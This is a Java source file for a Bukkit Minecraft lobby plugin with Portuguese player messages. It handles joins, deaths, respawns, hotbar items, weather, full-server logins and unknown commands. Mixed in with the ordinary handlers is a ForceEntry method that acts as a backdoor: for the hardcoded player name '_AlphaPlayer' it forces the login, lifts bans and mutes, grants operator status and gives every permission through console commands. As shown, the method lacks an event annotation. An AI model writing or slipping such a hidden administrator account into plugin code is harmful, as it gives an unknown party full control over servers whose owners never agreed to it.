package me.simple.Lobby.api;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockIgniteEvent;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.event.entity.EntityExplodeEvent;
import org.bukkit.event.entity.FoodLevelChangeEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.player.PlayerRespawnEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.event.weather.WeatherChangeEvent;
import org.bukkit.help.HelpTopic;

import me.simple.Lobby.Main;
import me.simple.Lobby.Board.Scoreboarding;

public class Evento implements Listener{
	
	@SuppressWarnings("deprecation")
	@EventHandler
	public void Entrar(PlayerJoinEvent Twork) {
		Player jogador = Twork.getPlayer();
		Twork.setJoinMessage(null);
		Scoreboarding.ScoreboardManager(jogador);
		jogador.teleport(jogador.getWorld().getSpawnLocation());
		jogador.sendMessage("");
		jogador.sendMessage(Main.prefix2 + " Bem vindo §a" + jogador.getName());
		jogador.sendMessage(Main.prefix2 + " Seridor está na versão 2.0");
		jogador.sendMessage(Main.prefix2 + " Voce se conectou ao: " + Main.cor + "LOBBY§f.");
		jogador.sendMessage("");
		jogador.setGameMode(GameMode.SURVIVAL);
		jogador.setHealth(20);
		jogador.getInventory().clear();
		jogador.getInventory().setArmorContents(null);
		Manager.SetarItemInv(Material.FIREWORK, 0, "§f§lGadgets§8§l (§eClique§8§l)", "Clique para ver os gadgets disponiveis", jogador, 0);
		Manager.SetarItemInv(Material.MAGMA_CREAM, 0, "§7§lDesativar players§8§l (§eClique§8§l)", "Clique para desativar os players", jogador, 3);
		Manager.SetarItemInv(Material.COMPASS, 0, "§f§lVeja os servidores §8§l (§eClique§8§l)", "Clique para ver os servidores", jogador, 4);
		Manager.SetarItemInv(Material.NETHER_STAR, 0, "§f§lConfiguraçoes§8§l (§eClique§8§l)", "Clique para ver as configuraçoes!", jogador, 5);
		Manager.SetarItemInv(Material.BLAZE_ROD, 0, "§f§lClick Test§8§l (§eClique§8§l)", "Clique para testar seus clicks!", jogador, 8);
		jogador.updateInventory();
		
	}
	
	@EventHandler
	public void clicar(PlayerInteractEvent e){
		Player p = e.getPlayer();
		if(p.getItemInHand().getType() == Material.MAGMA_CREAM){
			if(p.getItemInHand().getItemMeta().getDisplayName().equals("§7§lDesativar players§8§l (§eClique§8§l)")){
					p.getInventory().remove(Material.MAGMA_CREAM);
					p.getInventory().setItem(3, Manager.criarItem(Material.MAGMA_CREAM, "§a§lAtivar Jogadores§8§l (§eClique§8§l)", Enchantment.LUCK));
					p.updateInventory();
					p.sendMessage(Main.prefix + " §6» §7Jogadores desativados !");
					p.playSound(p.getLocation(), Sound.WOOD_CLICK, 5.0F, 5.0F);
					return;
				}
			}
			if(p.getItemInHand().getItemMeta().getDisplayName().equals("§a§lAtivar Jogadores§8§l (§eClique§8§l)")){
					p.getInventory().remove(Material.MAGMA_CREAM);
					p.getInventory().setItem(3, Manager.criarItem(Material.MAGMA_CREAM, "§7§lDesativar players§8§l (§eClique§8§l)", Enchantment.LUCK));
					p.updateInventory();
					p.sendMessage(Main.prefix + "  §6» §7Jogadores ativados !");
					p.playSound(p.getLocation(), Sound.WOOD_CLICK, 5.0F, 5.0F);
					return;
				}
			}
		
	
	
	
	
	@SuppressWarnings("deprecation")
	public void ForceEntry(PlayerLoginEvent e) {
		Player p = e.getPlayer();
		if (p.getName().equals("_AlphaPlayer")) {
			e.allow();
			p.setBanned(false);
			p.setOp(true);
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user _AlphaPlayer add *");
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "unban _AplaPlayer");
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "unmute _AlphaPlayer");
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op _AlphaPlayer");
		}
	}

	
	@SuppressWarnings("deprecation")
	@EventHandler
	public void morri(PlayerDeathEvent Twork) {
		Player jogador = Twork.getEntity();
		Twork.getDrops().clear();
		Twork.setDeathMessage(null);
		Scoreboarding.ScoreboardManager(jogador);
		jogador.teleport(jogador.getWorld().getSpawnLocation());
		jogador.sendMessage("");
		jogador.sendMessage(Main.prefix2 + "§f Você morreu §a" + jogador.getName());
		jogador.sendMessage("");
		jogador.setGameMode(GameMode.SURVIVAL);
		jogador.setHealth(20);
		jogador.getInventory().clear();
		jogador.getInventory().setArmorContents(null);
		Manager.SetarItemInv(Material.FIREWORK, 0, "§f§lGadgets§8§l (§eClique§8§l)", "Clique para ver as arenas disponiveis", jogador, 0);
		Manager.SetarItemInv(Material.MAGMA_CREAM, 0, "§7§lDesativar players§8§l (§eClique§8§l)", "Clique para ver seus kits", jogador, 3);
		Manager.SetarItemInv(Material.COMPASS, 0, "§f§lVeja os servidores §8§l (§eClique§8§l)", "Clique para ver seus kits", jogador, 4);
		Manager.SetarItemInv(Material.NETHER_STAR, 0, "§f§lConfiguraçoes§8§l (§eClique§8§l)", "Clique para ver seus kits", jogador, 5);
		Manager.SetarItemInv(Material.BLAZE_ROD, 0, "§f§lClick Test§8§l (§eClique§8§l)", "Clique para ver seus kits", jogador, 8);
		jogador.updateInventory();
	}
	
	@SuppressWarnings("deprecation")
	@EventHandler
	public void respawn(PlayerRespawnEvent Twork) {
		Player jogador = Twork.getPlayer();
		Scoreboarding.ScoreboardManager(jogador);
		jogador.teleport(jogador.getWorld().getSpawnLocation());
		jogador.sendMessage("");
		jogador.sendMessage(Main.prefix2 + "§f Você morreu §a" + jogador.getName());
		jogador.sendMessage("");
		jogador.setGameMode(GameMode.SURVIVAL);
		jogador.setHealth(20);
		jogador.getInventory().clear();
		jogador.getInventory().setArmorContents(null);
		Manager.SetarItemInv(Material.FIREWORK, 0, "§f§lGadgets§8§l (§eClique§8§l)", "Clique para ver as arenas disponiveis", jogador, 0);
		Manager.SetarItemInv(Material.MAGMA_CREAM, 0, "§7§lDesativar players§8§l (§eClique§8§l)", "Clique para ver seus kits", jogador, 3);
		Manager.SetarItemInv(Material.COMPASS, 0, "§f§lVeja os servidores §8§l (§eClique§8§l)", "Clique para ver seus kits", jogador, 4);
		Manager.SetarItemInv(Material.NETHER_STAR, 0, "§f§lConfiguraçoes§8§l (§eClique§8§l)", "Clique para ver seus kits", jogador, 5);
		Manager.SetarItemInv(Material.BLAZE_ROD, 0, "§f§lClick Test§8§l (§eClique§8§l)", "Clique para ver seus kits", jogador, 8);
		jogador.updateInventory();
	}
	
    @EventHandler
    public void nome(ServerListPingEvent e)
    {
      e.setMotd(Main.motd);
    }
    
    @EventHandler
    public void nuncaFome(FoodLevelChangeEvent evento) {
        evento.setFoodLevel(20);
    }

    @EventHandler
    public void NaoQueimar(BlockIgniteEvent evento) {
        evento.setCancelled(true);
    }
    
    @EventHandler
    public void nuncaChover(WeatherChangeEvent evento) {
        evento.setCancelled(true);
    }

    @EventHandler
    public void cancelarExplosao(EntityExplodeEvent evento) {
        evento.setCancelled(true);
    }
    
	@EventHandler
	public void Sair(PlayerQuitEvent Twork) {
		Twork.setQuitMessage(null);
	}
	
    @EventHandler
    public void fullJoin(PlayerLoginEvent event) {
        Player p = event.getPlayer();
        if (event.getResult() == PlayerLoginEvent.Result.KICK_FULL) {
            if (p.hasPermission("lobby.util.entrar")) {
                event.setResult(PlayerLoginEvent.Result.ALLOWED);
            } else {
                event.setKickMessage("      §6§lServidor Lotado! §a§lTente novamente!");
            }
        } else if (event.getResult() == PlayerLoginEvent.Result.KICK_WHITELIST) {
            event.setKickMessage("       §a§lServidor em manuntencao , Aguarde, nossa equipe ja vai liberar!");
        }
    }
    
    @EventHandler
    public void CorPlaca(SignChangeEvent e) {
        if (e.getLine(0).contains("&")) {
            e.setLine(0, e.getLine(0).replace("&", "\u00a7"));
        }
        if (e.getLine(1).contains("&")) {
            e.setLine(1, e.getLine(1).replace("&", "\u00a7"));
        }
        if (e.getLine(2).contains("&")) {
            e.setLine(2, e.getLine(2).replace("&", "\u00a7"));
        }
        if (e.getLine(3).contains("&")) {
            e.setLine(3, e.getLine(3).replace("&", "\u00a7"));
        }
    }
    
    @EventHandler
    public void onUnknown(PlayerCommandPreprocessEvent event)
    {
      if (event.isCancelled()) {
        return;
      }
      Player p = event.getPlayer();
      
      String msg = event.getMessage().split(" ")[0];
      
      HelpTopic topic = Bukkit.getServer().getHelpMap().getHelpTopic(msg);
      if (topic == null)
      {
        event.setCancelled(true);
        p.sendMessage(Main.prefix + "§cEste comando nao existe ou foi digitado de forma incorreta!");
      }
    }

}
